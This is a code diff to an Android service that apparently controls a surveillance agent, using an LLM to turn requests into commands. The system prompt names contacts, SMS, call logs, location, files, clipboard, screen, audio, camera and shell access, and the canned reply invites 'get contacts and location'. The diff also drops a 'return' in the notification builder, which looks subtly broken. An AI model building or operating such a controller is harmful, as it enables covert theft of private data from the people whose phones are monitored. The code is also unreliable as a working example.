@@ -42,7 +42,7 @@ class ControllerService : Service() {
     private var commandReceiver: CommandReceiver? = null
     private var resultReceiver: ResultReceiver? = null
     private val pendingCommands = ConcurrentHashMap<String, CommandCallback>()
-    private val aiClient = OkHttpClient.Builder().connectTimeout(30, TimeUnit.SECONDS).readTimeout(60, TimeUnit.SECONDS).build()
+    private val aiClient = OkHttpClient.Builder().connectTimeout(10, TimeUnit.SECONDS).readTimeout(30, TimeUnit.SECONDS).build()
 
     interface CommandCallback {
         fun onResult(taskId: String, result: CommandResult)
@@ -118,7 +118,7 @@ class ControllerService : Service() {
             flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
         }
         val pi = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
-        return NotificationCompat.Builder(this, "controller_service")
+        NotificationCompat.Builder(this, "controller_service")
             .setContentTitle("SysMonitor Controller")
             .setContentText("Connected to agent: $agentPackage")
             .setSmallIcon(android.R.drawable.stat_notify_sync)
@@ -248,7 +248,7 @@ class ControllerService : Service() {
                 }
             } catch (e: Exception) {
                 Log.e("AI", "Error", e)
-                callback?.onResult(taskId, CommandResult(null, e.message, "failed"))
+                callback?.onResult(taskId, CommandResult(null, e.message ?: "failed", "failed"))
             }
         }, "ai-$taskId").start()
 
@@ -257,6 +257,11 @@ class ControllerService : Service() {
 
     private fun callNemotron(prompt: String): String {
         try {
+            val lower = prompt.lowercase()
+            if (lower.matches("^(hi|hello|hey|test|ping)$")) {
+                return """{"action": "none", "response": "Hello! I'm ready. Use /help for commands or ask me to run tasks like 'get contacts and location'."}"""
+            }
+
             val systemPrompt = """You are an AI assistant controlling an Android monitoring agent.
 Available capabilities: contacts, sms, call_logs, apps, location, files, wifi, clipboard, screen, audio, camera, shell
 For each user request, respond with a JSON object containing:
@@ -301,7 +306,7 @@ Only respond with valid JSON, no extra text."""
             }
         } catch (e: Exception) {
             Log.e("Nemotron", "Error", e)
-            return "{\"error\": \"${e.message}\"}"
+            return "{\"error\": \"${e.message ?: "unknown error"}\"}"
         }
     }
 
@@ -331,7 +336,7 @@ Only respond with valid JSON, no extra text."""
                         entry.value.isJsonPrimitive && entry.value.asJsonPrimitive.isString -> entry.value.asString
                         entry.value.isJsonPrimitive && entry.value.asJsonPrimitive.isNumber -> entry.value.asJsonPrimitive.asDouble
                         entry.value.isJsonPrimitive && entry.value.asJsonPrimitive.isBoolean -> entry.value.asBoolean
-                        else -> entry.value.toString()
+                        else -> entry.value.toString() ?: ""
                     }
                     argsMap[entry.key] = value
                 }
